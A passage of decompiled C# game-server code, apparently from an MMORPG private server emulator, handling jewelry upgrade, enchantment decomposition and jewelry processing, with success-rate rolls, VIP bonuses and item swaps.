						double num55 = RNG.Next(0, 101 + value131.FLD_LEVEL * 2);
						double num56 = 0.0;
						if (hcItimesClass95 != null)
						{
							num56 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass95.物品id, 0));
						}
						if (元宝合成开关 == 1)
						{
							num56 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num56 += 100.0 * World.VIP合成率增加百分比;
						}
						if (World.首饰升级率 != 0.0)
						{
							num56 += 100.0 * World.首饰升级率;
						}
						if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
						{
							num56 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
						}
						if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
						{
							num56 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
						}
						byte[] 物品id = hcItimesClass94.物品id;
						if (num56 >= num55)
						{
							int num57 = 首饰升级取首饰(value131.FLD_RESIDE2, value131.FLD_PID, 0);
							if (num57 == 0)
							{
								合成提示(num, 19, 合成手续费, 装备栏包裹[hcItimesClass94.位置]);
								RxjhClass.合成记录(base.Userid, base.UserName, value131.ItmeNAME, num, "首饰升级", "失败", 装备栏包裹[hcItimesClass94.位置]);
								合成物品表.Clear();
								break;
							}
							byte[] bytes = BitConverter.GetBytes(num57);
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass94.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass94.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass94.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass94.位置, 1);
								if (World.Itme.TryGetValue(num57, out var value133))
								{
									byte[] array3 = new byte[World.物品属性大小];
									Buffer.BlockCopy(hcItimesClass94.物品属性, 0, array3, 0, World.物品属性大小);
									Buffer.BlockCopy(BitConverter.GetBytes(value133.FLD_MAGIC1), 0, array3, 4, 4);
									Buffer.BlockCopy(BitConverter.GetBytes(value133.FLD_MAGIC2), 0, array3, 8, 4);
									Buffer.BlockCopy(BitConverter.GetBytes(value133.FLD_MAGIC3), 0, array3, 12, 4);
									Buffer.BlockCopy(BitConverter.GetBytes(value133.FLD_MAGIC4), 0, array3, 16, 4);
									增加物品(hcItimesClass94.物品全局ID, bytes, hcItimesClass94.位置, hcItimesClass94.物品数量, array3);
								}
							}
							if (hcItimesClass95 != null)
							{
								减去物品(hcItimesClass95.位置, 1);
							}
							RxjhClass.合成记录(base.Userid, base.UserName, value131.ItmeNAME, num, "首饰升级", "成功", 装备栏包裹[hcItimesClass94.位置]);
							合成提示(num, 11, 合成手续费, 装备栏包裹[hcItimesClass94.位置]);
						}
						else
						{
							int num58 = 首饰升级取首饰(value131.FLD_RESIDE2, value131.FLD_PID, 1);
							if (num58 != 0)
							{
								double num59 = RNG.Next(0, 100);
								byte[] bytes2 = BitConverter.GetBytes(num58);
								if (!(num59 < 0.0) && ((num59 < 10.0) ? true : false))
								{
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass94.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass94.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass94.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass94.位置, 1);
										if (World.Itme.TryGetValue(num58, out var value134))
										{
											byte[] array4 = new byte[World.物品属性大小];
											Buffer.BlockCopy(hcItimesClass94.物品属性, 0, array4, 0, World.物品属性大小);
											Buffer.BlockCopy(BitConverter.GetBytes(value134.FLD_MAGIC1), 0, array4, 4, 4);
											Buffer.BlockCopy(BitConverter.GetBytes(value134.FLD_MAGIC2), 0, array4, 8, 4);
											Buffer.BlockCopy(BitConverter.GetBytes(value134.FLD_MAGIC3), 0, array4, 12, 4);
											Buffer.BlockCopy(BitConverter.GetBytes(value134.FLD_MAGIC4), 0, array4, 16, 4);
											增加物品(hcItimesClass94.物品全局ID, bytes2, hcItimesClass94.位置, hcItimesClass94.物品数量, array4);
										}
									}
								}
								else
								{
									减去物品(hcItimesClass94.位置, 1);
								}
							}
							else
							{
								减去物品(hcItimesClass94.位置, 1);
							}
							if (hcItimesClass95 != null)
							{
								减去物品(hcItimesClass95.位置, 1);
							}
							合成提示(num, 10, 合成手续费, 装备栏包裹[hcItimesClass94.位置]);
						}
						装备栏包裹[hcItimesClass94.位置].锁定 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						合成手续费 = 0;
					}
					else
					{
						合成提示(num, 19, 0, 装备栏包裹[hcItimesClass94.位置]);
						合成物品表.Clear();
					}
					break;
				}
				case 181:
				{
					if (合成物品表.Count <= 0 || ((!合成物品表.ContainsKey(1)) ? true : false))
					{
						break;
					}
					HcItimesClass hcItimesClass72 = null;
					HcItimesClass hcItimesClass73 = null;
					if (合成物品表.ContainsKey(1))
					{
						hcItimesClass72 = 合成物品表[1];
					}
					if (合成物品表.ContainsKey(2))
					{
						hcItimesClass73 = 合成物品表[2];
					}
					if (BitConverter.ToInt64(装备栏包裹[hcItimesClass72.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass72.物品全局ID, 0) || (hcItimesClass73 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass73.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass73.物品全局ID, 0)) ? true : false)))
					{
						break;
					}
					if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass72.物品id, 0), out var value81))
					{
						if (value81.FLD_RESIDE2 != 7 && value81.FLD_RESIDE2 != 8 && ((value81.FLD_RESIDE2 != 10) ? true : false))
						{
							合成提示(num, 29, 0, 装备栏包裹[hcItimesClass72.位置]);
							合成物品表.Clear();
							break;
						}
						if (value81.FLD_UP_LEVEL == 0)
						{
							合成提示(num, 19, 0, 装备栏包裹[num30]);
							合成物品表.Clear();
							break;
						}
						if (value81.FLD_PID == 100001 || (value81.FLD_PID == 1 && ((value81.FLD_PID == 700001) ? true : false)))
						{
							合成提示(num, 29, 0, 装备栏包裹[num30]);
							合成物品表.Clear();
							break;
						}
						if (base.Player_Money < 10000000)
						{
							合成提示(11, 4, 10000000, 装备栏包裹[hcItimesClass72.位置]);
							合成物品表.Clear();
							break;
						}
						base.Player_Money -= 10000000L;
						更新金钱和负重();
						double num14 = RNG.Next(0, 101 + value81.FLD_LEVEL);
						double num15 = 0.0;
						if (hcItimesClass73 != null)
						{
							switch (BitConverter.ToInt32(hcItimesClass73.物品id, 0))
							{
							case 800000003:
								num15 += 5.0;
								break;
							case 800000004:
								num15 += 10.0;
								break;
							case 800000005:
								num15 += 15.0;
								break;
							case 800000029:
							case 1008000071:
								num15 += 20.0;
								break;
							case 1008000136:
								num15 += 25.0;
								break;
							}
						}
						if (元宝合成开关 == 1)
						{
							num15 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num15 += 20.0;
						}
						if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
						{
							num15 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
						}
						if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
						{
							num15 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
						}
						byte[] 物品id2 = hcItimesClass72.物品id;
						if (num15 >= num14)
						{
							int num16 = 首饰升级取首饰(value81.FLD_RESIDE2, value81.FLD_PID, 1);
							if (num16 == 0)
							{
								合成提示(num, 29, 合成手续费, 装备栏包裹[hcItimesClass72.位置]);
								合成物品表.Clear();
								break;
							}
							double num17 = RNG.Next(0, 100);
							int value82 = 1;
							if (!(num17 < 0.0) && ((num17 < 10.0) ? true : false))
							{
								value82 = RNG.Next(2, 5);
							}
							byte[] bytes3 = BitConverter.GetBytes(num16);
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass72.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass72.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass72.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass72.位置, 1);
								if (World.Itme.TryGetValue(num16, out var value83))
								{
									byte[] array29 = new byte[World.物品属性大小];
									Buffer.BlockCopy(hcItimesClass72.物品属性, 0, array29, 0, World.物品属性大小);
									Buffer.BlockCopy(BitConverter.GetBytes(value83.FLD_MAGIC1), 0, array29, 4, 4);
									Buffer.BlockCopy(BitConverter.GetBytes(value83.FLD_MAGIC2), 0, array29, 8, 4);
									Buffer.BlockCopy(BitConverter.GetBytes(value83.FLD_MAGIC3), 0, array29, 12, 4);
									Buffer.BlockCopy(BitConverter.GetBytes(value83.FLD_MAGIC4), 0, array29, 16, 4);
									增加物品(hcItimesClass72.物品全局ID, bytes3, hcItimesClass72.位置, BitConverter.GetBytes(value82), array29);
								}
							}
							if (hcItimesClass73 != null)
							{
								减去物品(hcItimesClass73.位置, 1);
							}
							合成提示(num, 21, 合成手续费, 装备栏包裹[hcItimesClass72.位置]);
						}
						else
						{
							int num18 = 首饰升级取首饰(value81.FLD_RESIDE2, value81.FLD_PID, 1);
							if (num18 == 0)
							{
								合成提示(num, 29, 合成手续费, 装备栏包裹[hcItimesClass72.位置]);
								合成物品表.Clear();
								break;
							}
							byte[] bytes4 = BitConverter.GetBytes(num18);
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass72.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass72.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass72.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass72.位置, 1);
								if (World.Itme.TryGetValue(num18, out var value84))
								{
									byte[] array30 = new byte[World.物品属性大小];
									Buffer.BlockCopy(hcItimesClass72.物品属性, 0, array30, 0, World.物品属性大小);
									Buffer.BlockCopy(BitConverter.GetBytes(value84.FLD_MAGIC1), 0, array30, 4, 4);
									Buffer.BlockCopy(BitConverter.GetBytes(value84.FLD_MAGIC2), 0, array30, 8, 4);
									Buffer.BlockCopy(BitConverter.GetBytes(value84.FLD_MAGIC3), 0, array30, 12, 4);
									Buffer.BlockCopy(BitConverter.GetBytes(value84.FLD_MAGIC4), 0, array30, 16, 4);
									增加物品(hcItimesClass72.物品全局ID, bytes4, hcItimesClass72.位置, hcItimesClass72.物品数量, array30);
								}
							}
							if (hcItimesClass73 != null)
							{
								减去物品(hcItimesClass73.位置, 1);
							}
							合成提示(num, 21, 合成手续费, 装备栏包裹[hcItimesClass72.位置]);
						}
						装备栏包裹[hcItimesClass72.位置].锁定 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						合成手续费 = 0;
					}
					else
					{
						合成提示(num, 29, 0, 装备栏包裹[hcItimesClass72.位置]);
						合成物品表.Clear();
					}
					break;
				}
				case 182:
					try
					{
						if (合成物品表.ContainsKey(1))
						{
							break;
						}
						ItmeClass value92;
						if (装备栏包裹[num30].锁定)
						{
							合成提示(num, 19, 0, 装备栏包裹[num30]);
						}
						else if (装备栏包裹[num30].物品绑定)
						{
							合成提示(num, 19, 0, 装备栏包裹[num30]);
						}
						else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value92))
						{
							if (value92.FLD_RESIDE2 != 7 && value92.FLD_RESIDE2 != 8 && ((value92.FLD_RESIDE2 != 10) ? true : false))
							{
								合成提示(num, 19, 0, 装备栏包裹[num30]);
								break;
							}
							if (value92.FLD_UP_LEVEL == 0)
							{
								合成提示(num, 19, 0, 装备栏包裹[num30]);
								break;
							}
							int 钱数6 = (合成手续费 = 计算合成强化费用(value92, num30, num));
							HcItimesClass hcItimesClass61 = new HcItimesClass();
							hcItimesClass61.位置 = num30;
							hcItimesClass61.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value93 = hcItimesClass61;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value93);
							合成提示(num, 1, 钱数6, 装备栏包裹[num30]);
						}
						else
						{
							合成提示(num, 19, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex21)
					{
						MainForm.WriteLine(1, "合成系统 首饰升级 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex21.Message);
					}
					break;
				case 183:
					try
					{
						if (合成物品表.Count == 0)
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else if (合成物品表.ContainsKey(1) && !合成物品表.ContainsKey(2))
						{
							合成物品表.TryAdd(2, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex17)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex17.Message);
					}
					break;
				case 190:
				{
					if (合成物品表.Count <= 0)
					{
						break;
					}
					HcItimesClass hcItimesClass119 = null;
					if (!合成物品表.ContainsKey(1))
					{
						break;
					}
					HcItimesClass hcItimesClass121 = 合成物品表[1];
					if (!合成物品表.ContainsKey(2))
					{
						break;
					}
					HcItimesClass hcItimesClass122 = 合成物品表[2];
					if (合成物品表.ContainsKey(3))
					{
						hcItimesClass119 = 合成物品表[3];
					}
					if (BitConverter.ToInt64(装备栏包裹[hcItimesClass121.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass121.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass122.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass122.物品全局ID, 0) || (hcItimesClass119 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass119.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass119.物品全局ID, 0)) ? true : false)))
					{
						break;
					}
					if (装备栏包裹[hcItimesClass121.位置].物品绑定)
					{
						合成提示(num, 2, 0, 装备栏包裹[hcItimesClass121.位置]);
						break;
					}
					double num81 = RNG.Next(0, 100);
					double num82 = 40.0;
					if (hcItimesClass119 != null)
					{
						num81 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass119.物品id, 0));
					}
					if (元宝合成开关 == 1)
					{
						num81 += 5.0;
					}
					if (base.FLD_VIP == 1)
					{
						num81 += 100.0 * World.VIP合成率增加百分比;
					}
					if (World.合成率 != 0.0)
					{
						num81 += 100.0 * World.合成率;
					}
					if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
					{
						num81 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
					}
					if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
					{
						num81 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
					}
					if (num81 >= num82)
					{
						hcItimesClass121.FLD_FJ_中级附魂 = 0;
						减去物品(hcItimesClass121.位置, 1);
						增加物品(hcItimesClass121.物品全局ID, hcItimesClass121.物品id, hcItimesClass121.位置, hcItimesClass121.物品数量, hcItimesClass121.物品属性);
						if (hcItimesClass122 != null)
						{
							减去物品(hcItimesClass122.位置, 1);
						}
						if (hcItimesClass119 != null)
						{
							减去物品(hcItimesClass119.位置, 1);
						}
						装备栏包裹[hcItimesClass121.位置].锁定 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						RxjhClass.合成记录(base.Userid, base.UserName, 装备栏包裹[hcItimesClass121.位置].得到物品名称(), num, "附魂分解", "成功", 装备栏包裹[hcItimesClass121.位置]);
						合成提示(num, 1, 0, 装备栏包裹[num30]);
					}
					else
					{
						if (hcItimesClass122 != null)
						{
							减去物品(hcItimesClass122.位置, 1);
						}
						if (hcItimesClass119 != null)
						{
							减去物品(hcItimesClass119.位置, 1);
						}
						装备栏包裹[hcItimesClass121.位置].锁定 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						RxjhClass.合成记录(base.Userid, base.UserName, 装备栏包裹[hcItimesClass121.位置].得到物品名称(), num, "附魂分解", "失败", 装备栏包裹[hcItimesClass121.位置]);
						合成提示(num, 0, 0, 装备栏包裹[num30]);
					}
					break;
				}
				case 191:
					try
					{
						if (!合成物品表.ContainsKey(1) && !装备栏包裹[num30].物品绑定 && 装备栏包裹[num30].FLD_FJ_中级附魂 != 0)
						{
							HcItimesClass hcItimesClass60 = new HcItimesClass();
							hcItimesClass60.位置 = num30;
							hcItimesClass60.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value183 = hcItimesClass60;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value183);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex93)
					{
						MainForm.WriteLine(1, "合成系统 附魂分解 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex93.Message);
					}
					break;
				case 192:
					try
					{
						if (!合成物品表.ContainsKey(2) && BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == 1000000780)
						{
							HcItimesClass hcItimesClass59 = new HcItimesClass();
							hcItimesClass59.位置 = num30;
							hcItimesClass59.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value181 = hcItimesClass59;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(2, value181);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex91)
					{
						MainForm.WriteLine(1, "合成系统 附魂分解 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex91.Message);
					}
					break;
				case 193:
					try
					{
						if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
						{
							HcItimesClass hcItimesClass58 = new HcItimesClass();
							hcItimesClass58.位置 = num30;
							hcItimesClass58.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value10 = hcItimesClass58;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(3, value10);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex102)
					{
						MainForm.WriteLine(1, "合成系统 附魂分解 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex102.Message);
					}
					break;
				case 199:
					try
					{
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
						合成提示(num, 1, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex90)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 附魂分解 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex90.Message);
					}
					break;
				case 200:
				{
					int num83 = 0;
					try
					{
						if (base.当前操作类型 != 148)
						{
							break;
						}
						HcItimesClass hcItimesClass123;
						HcItimesClass value186;
						HcItimesClass hcItimesClass124;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass123 = 合成物品表[1];
							hcItimesClass123.得到属性();
							hcItimesClass123.强化属性阶段();
							num83 = 1;
							value186 = null;
							hcItimesClass124 = null;
							if (!合成物品表.ContainsKey(4))
							{
								goto IL_18097;
							}
							hcItimesClass124 = 合成物品表[4];
							if (装备栏包裹[hcItimesClass124.位置].Get物品全局ID == BitConverter.ToInt64(hcItimesClass124.物品全局ID, 0))
							{
								goto IL_18097;
							}
						}
						else
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						goto end_IL_17f8c;
						IL_18097:
						num83 = 2;
						ItmeClass value4;
						if (合成物品表.TryGetValue(3, out var value3))
						{
							if (BitConverter.ToInt32(value3.物品数量, 0) < 1)
							{
								合成提示(num, 8, 0, 装备栏包裹[num30]);
								break;
							}
							num83 = 3;
							if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass123.物品id, 0), out value4))
							{
								if (value4.FLD_RESIDE2 == 7)
								{
									if (装备栏包裹[value3.位置].Get物品ID == 1000000638 || 装备栏包裹[value3.位置].Get物品ID == 1008000453)
									{
										goto IL_182bb;
									}
								}
								else if (value4.FLD_RESIDE2 == 8)
								{
									if (装备栏包裹[value3.位置].Get物品ID == 1000000637 || 装备栏包裹[value3.位置].Get物品ID == 1008000452)
									{
										goto IL_182bb;
									}
								}
								else if (value4.FLD_RESIDE2 == 10 && (装备栏包裹[value3.位置].Get物品ID == 1000000639 || 装备栏包裹[value3.位置].Get物品ID == 1008000454))
								{
									goto IL_182bb;
								}
							}
							else
							{
								合成提示(num, 7, 0, 装备栏包裹[num30]);
							}
						}
						else
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						goto end_IL_17f8c;
						IL_182bb:
						if (value4.FLD_RESIDE2 != 7 && value4.FLD_RESIDE2 != 8 && ((value4.FLD_RESIDE2 != 10) ? true : false))
						{
							break;
						}
						if (value4.FLD_LEVEL >= 100)
						{
							if (合成物品表.TryGetValue(2, out value186))
							{
								if (BitConverter.ToInt32(value186.物品数量, 0) >= 2)
								{
									goto IL_18434;
								}
								合成提示(num, 8, 0, 装备栏包裹[num30]);
							}
							else
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							break;
						}
						if (value4.FLD_LEVEL < 80)
						{
							goto IL_18434;
						}
						if (合成物品表.TryGetValue(2, out value186))
						{
							if (BitConverter.ToInt32(value186.物品数量, 0) >= 1)
							{
								goto IL_18434;
							}
							合成提示(num, 8, 0, 装备栏包裹[num30]);
						}
						else
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						goto end_IL_17f8c;
						IL_18434:
						num83 = 4;
						if (装备栏包裹[hcItimesClass123.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass123.位置]);
							break;
						}
						num83 = 5;
						double num84 = RNG.Next(1, 100);
						double num86 = 100.0;
						if (hcItimesClass123.强化数量 >= 10)
						{
							合成物品表.Clear();
							合成提示(num, 0, 0, 装备栏包裹[num30]);
							break;
						}
						num83 = 6;
						if (元宝合成开关 == 1)
						{
							num84 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num84 += World.VIP合成率增加百分比;
						}
						if (World.首饰加工率 != 0.0)
						{
							num84 += 100.0 * World.首饰加工率 + 0.1;
						}
						if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
						{
							num84 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
						}
						if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
						{
							num84 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
						}
						if (value3 != null)
						{
							num84 += (double)高级首饰材料(BitConverter.ToInt32(value3.物品id, 0));
						}
						switch (hcItimesClass123.强化数量)
						{
						case 0:
							num86 -= World.首饰加工一概率;
							break;
						case 1:
							num86 -= World.首饰加工二概率;
							break;
						case 2:
							num86 -= World.首饰加工三概率;
							break;
						case 3:
							num86 -= World.首饰加工四概率;
							break;
						case 4:
							num86 -= World.首饰加工五概率;
							break;
						case 5:
							num86 -= World.首饰加工六概率;
							break;
						case 6:
							num86 -= World.首饰加工七概率;
							break;
						case 7:
							num86 -= World.首饰加工八概率;
							break;
						case 8:
							num86 -= World.首饰加工九概率;
							break;
						case 9:
							num86 -= World.首饰加工十概率;
							break;
						}
						if (num84 >= num86)
						{
							if (value4.FLD_RESIDE2 == 7)
							{
								hcItimesClass123.强化类型 = 2;
							}
							else if (value4.FLD_RESIDE2 == 8)
							{
								hcItimesClass123.强化类型 = 3;
							}
							else if (value4.FLD_RESIDE2 == 10)
							{
								hcItimesClass123.强化类型 = 1;
							}
							if (hcItimesClass124 == null)
							{
								hcItimesClass123.强化数量++;
							}
							else if (BitConverter.ToInt32(hcItimesClass124.物品id, 0) == 1008000072)
							{
								hcItimesClass123.强化数量 += RNG.Next(1, 3);
							}
							else if (BitConverter.ToInt32(hcItimesClass124.物品id, 0) == 1000000619)
							{
								hcItimesClass123.强化数量++;
							}
							if (hcItimesClass123.强化数量 > 10)
							{
								hcItimesClass123.强化数量 = 10;
							}
							num83 = 7;
							hcItimesClass123.设置阶段属性();
							num83 = 8;
							if (hcItimesClass123.强化数量 >= int.Parse(World.强化数量大于发送快报[2]))
							{
								发送快报(base.UserName, hcItimesClass123.强化数量, hcItimesClass123.物品id, base.Player_Zx);
							}
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass123.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass123.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass123.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass123.位置, 1);
								增加物品2(hcItimesClass123.物品全局ID, hcItimesClass123.物品id, hcItimesClass123.位置, hcItimesClass123.物品数量, hcItimesClass123.物品属性);
							}
							num83 = 9;
							装备栏包裹[hcItimesClass123.位置].锁定 = false;
							RxjhClass.合成记录(base.Userid, base.UserName, value4.ItmeNAME, num, "首饰加工", "成功", 装备栏包裹[num30]);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
						else
						{
							RxjhClass.合成记录(base.Userid, base.UserName, value4.ItmeNAME, num, "首饰加工", "失败", 装备栏包裹[hcItimesClass123.位置]);
							if (hcItimesClass124 != null)
							{
								if (BitConverter.ToInt32(hcItimesClass124.物品id, 0) == 1000000619)
								{
									if (hcItimesClass123.强化数量 <= 2)
									{
										if (value4.FLD_RESIDE2 == 7)
										{
											hcItimesClass123.强化类型 = 2;
										}
										else if (value4.FLD_RESIDE2 == 8)
										{
											hcItimesClass123.强化类型 = 3;
										}
										else if (value4.FLD_RESIDE2 == 10)
										{
											hcItimesClass123.强化类型 = 1;
										}
										hcItimesClass123.强化数量 = 2;
										if (hcItimesClass123.强化数量 > 10)
										{
											hcItimesClass123.强化数量 = 10;
										}
										hcItimesClass123.设置阶段属性();
										num83 = 10;
										if (BitConverter.ToInt32(装备栏包裹[hcItimesClass123.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass123.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass123.物品全局ID, 0)) ? true : false))
										{
											减去物品(hcItimesClass123.位置, 1);
											增加物品2(hcItimesClass123.物品全局ID, hcItimesClass123.物品id, hcItimesClass123.位置, hcItimesClass123.物品数量, hcItimesClass123.物品属性);
										}
										num83 = 11;
										装备栏包裹[hcItimesClass123.位置].锁定 = false;
										合成提示(num, 1, 0, 装备栏包裹[num30]);
									}
									else
									{
										num83 = 12;
										减去物品(hcItimesClass123.位置, 1);
										合成提示(num, 0, 0, 装备栏包裹[num30]);
									}
								}
								else if (BitConverter.ToInt32(hcItimesClass124.物品id, 0) == 1008000072)
								{
									hcItimesClass123.强化数量 = 0;
									hcItimesClass123.设置阶段属性();
									减去物品(hcItimesClass123.位置, 1);
									增加物品2(hcItimesClass123.物品全局ID, hcItimesClass123.物品id, hcItimesClass123.位置, hcItimesClass123.物品数量, hcItimesClass123.物品属性);
									合成提示(num, 0, 0, 装备栏包裹[num30]);
								}
								else
								{
									num83 = 13;
									减去物品(hcItimesClass123.位置, 1);
									合成提示(num, 0, 0, 装备栏包裹[num30]);
								}
							}
							else
							{
								num83 = 14;
								减去物品(hcItimesClass123.位置, 1);
								合成提示(num, 0, 0, 装备栏包裹[num30]);
							}
						}
						num83 = 15;
						if (value186 != null)
						{
							num83 = 16;
							if (value4.FLD_LEVEL >= 130)
							{
								减去物品(value186.位置, 4);
							}
							else if (value4.FLD_LEVEL >= 100)
							{
								减去物品(value186.位置, 3);
							}
							else if (value4.FLD_LEVEL >= 80)
							{
								减去物品(value186.位置, 2);
							}
							else
							{
								减去物品(value186.位置, 1);
							}
							num83 = 17;
						}
						num83 = 18;
						if (value3 != null)
						{
							if (value4.FLD_LEVEL >= 130)
							{
								减去物品(value3.位置, 4);
							}
							else if (value4.FLD_LEVEL >= 100)
							{
								减去物品(value3.位置, 2);
							}
							else if (value4.FLD_LEVEL >= 80)
							{
								减去物品(value3.位置, 1);
							}
							else
							{
								减去物品(value3.位置, 1);
							}
							num83 = 19;
						}
						num83 = 20;
						if (hcItimesClass124 != null)
						{
							num83 = 21;
							减去物品(hcItimesClass124.位置, 1);
						}
						num83 = 22;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						end_IL_17f8c:;
					}
					catch (Exception ex96)
					{
						MainForm.WriteLine(1, "200首饰加工 出错 " + base.Client.WorldId + "|" + base.Client.ToString() + " " + num83 + " " + ex96);
					}
					break;
				}
				case 201:
				{
					if (base.当前操作类型 != 148 || (合成物品表.ContainsKey(1) ? true : false))
					{
						break;
					}
					ItmeClass value2;
					if (装备栏包裹[num30].物品绑定)
					{
						合成提示(num, 7, 0, 装备栏包裹[num30]);
					}
					else if (装备栏包裹[num30].FLD_强化数量 >= 10)
					{
						合成提示(num, 7, 0, 装备栏包裹[num30]);
					}
					else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value2) && (value2.FLD_RESIDE2 == 7 || value2.FLD_RESIDE2 == 8 || value2.FLD_RESIDE2 == 10) && value2.FLD_LEVEL >= 60)
					{
						if (value2.FLD_LEVEL >= 100)
						{
							合成提示(num, 121, 0, 装备栏包裹[num30]);
							HcItimesClass hcItimesClass53 = new HcItimesClass();
							hcItimesClass53.位置 = num30;
							hcItimesClass53.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value13 = hcItimesClass53;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value13);
						}
						else if (value2.FLD_LEVEL >= 80)
						{
							合成提示(num, 111, 0, 装备栏包裹[num30]);
							HcItimesClass hcItimesClass54 = new HcItimesClass();
							hcItimesClass54.位置 = num30;
							hcItimesClass54.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value24 = hcItimesClass54;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value24);
						}
						else if (value2.FLD_LEVEL >= 60)
						{
							合成提示(num, 101, 0, 装备栏包裹[num30]);
							HcItimesClass hcItimesClass56 = new HcItimesClass();
							hcItimesClass56.位置 = num30;
							hcItimesClass56.物品 = 装备栏包裹[num30].物品_byte;
